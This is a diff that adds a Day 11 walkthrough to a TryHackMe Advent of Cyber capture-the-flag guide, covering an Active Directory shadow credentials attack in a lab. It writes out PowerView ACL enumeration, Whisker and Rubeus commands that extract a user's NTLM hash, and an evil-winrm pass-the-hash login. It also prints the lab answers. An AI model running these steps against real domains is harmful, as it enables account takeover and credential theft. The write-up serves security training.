@@ -23,8 +23,8 @@ This guide contains the answer and steps necessary to get to them for the [Adven
 - [Day 8 Have a Holly, Jolly Byte!](#day-8-have-a-holly-jolly-byte)
 - [Day 9 She sells C# shells by the C2shore](#day-9-she-sells-c-shells-by-the-c2shore)
 - [Day 10 Inject the Halls with EXEC Queries](#day-10-inject-the-halls-with-exec-queries)
-<!--- [Day 11 ](#day-11-)
-- [Day 12 ](#day-12-)
+- [Day 11 Jingle Bells, Shadow Spells](#day-11-jingle-bells-shadow-spells)
+<!--- [Day 12 ](#day-12-)
 - [Day 13 ](#day-13-)
 - [Day 14 ](#day-14-)
 - [Day 15 ](#day-15-)
@@ -624,17 +624,98 @@ In this task we are looking into the defaced website and try to hack back into t
 
 If you enjoyed this task, feel free to check out the [Software Security](https://tryhackme.com/module/software-security) module.
 
+### Day 11 Jingle Bells, Shadow Spells
+
+In this task we will utilize misconfigured privileges to compromise an Active Directory user.
+
+1. What is the hash of the vulnerable user?
+
+   First, we must establish which user is vulnerable to this attack. To do this we will use PowerView.
+
+   We can run the script and load it into memory using:
+
+   ```cmd
+   . .\PowerView.ps1
+   ```
+
+   Now we can list all vulnerable privileges by filtering the data using (filtering on the "hr" user will give us some clearer results):
+
+   ```cmd
+   Find-InterestingDomainAcl -ResolveGuids
+
+   filtered
+   
+   Find-InterestingDomainAcl -ResolveGuids | Where-Object { $_.IdentityReferenceName -eq "hr"}
+   ```
+
+   USER PRIVILEGES
+
+   We can see that the `hr` account has write permissions for the `vansprinkles` object (account).
+
+   Now we can user `Whisker` and `Rubeus` to exploit these permissions to give us the NTLM hash.
+
+   ```cmd
+   .\whisker.exe add /target:vansprinkles
+   ```
+
+   WHISKER
+
+   The resulting command we can use to get the NTLM hash with `Rubeus`.
+
+   ```cmd
+    .\Rubeus.exe asktgt /user:vansprinkles /certificate:<base64 encoded certificate> /password:"AG1sF7Nd1nAwZ2hZ" /domain:AOC.local /dc:southpole.AOC.local /getcredentials /show
+   ```
+
+   RUBEUS
+
+   ><details><summary>Click for answer</summary>03E805D8A8C5AA435FB48832DAD620E3</details>
+
+2. What is the content of flag.txt on the Administrator Desktop?
+
+   With this hash we can perform a pass-the-hash attack to log in as the compromised user using `Evil-Winrm`.
+
+   ```cmd
+   evil-winrm -i 10.10.163.140 -u vansprinkles -H 03E805D8A8C5AA435FB48832DAD620E3
+   ```
+
+   WINRM ERROR
+
+   Unfortunately, it didn't work via my kali box. Using the attackbox did work!
+
+   WINRM
+
+   Now we can navigate to the desktop and look for the flag.
+
+   FLAG
+
+   ><details><summary>Click for answer</summary>THM{XMAS_IS_SAFE}</details>
+
+If you enjoyed this task, feel free to check out the [Compromising Active Directory](https://tryhackme.com/module/hacking-active-directory) module!
+
+Van Sprinkles left some stuff around the DC. It's like a secret message waiting to be unravelled!
+
+##
+
+Looks like there are some chat logs available on the DC. Lets take a closer look at them and download them to our kali box. 
+
+In our `Evil-Winrm` shell we can use the following commands to download the files.
+
+```cmd
+download C:\Users\Administrator\Desktop\chatlog.html chatlog.html
+download C:\Users\Administrator\Desktop\chatlog_files chatlog_files
+```
+
+Now set up a python http server and download the files to our kali box using `wget` (after compressing the folder into a zip file).
+
+Looking at the chatlogs in our browser, we can see some interesting information. Looks like it is a chat log between McGreedy and someone who made the evil company logo.
+
+CHATLOG
+
+##
+
 More days are yet to come!
 
 <!---
-
-### Day 11 
-
-
-
-1. 
-
-   ><details><summary>Click for answer</summary></details>
 
 ### Day 12 
 
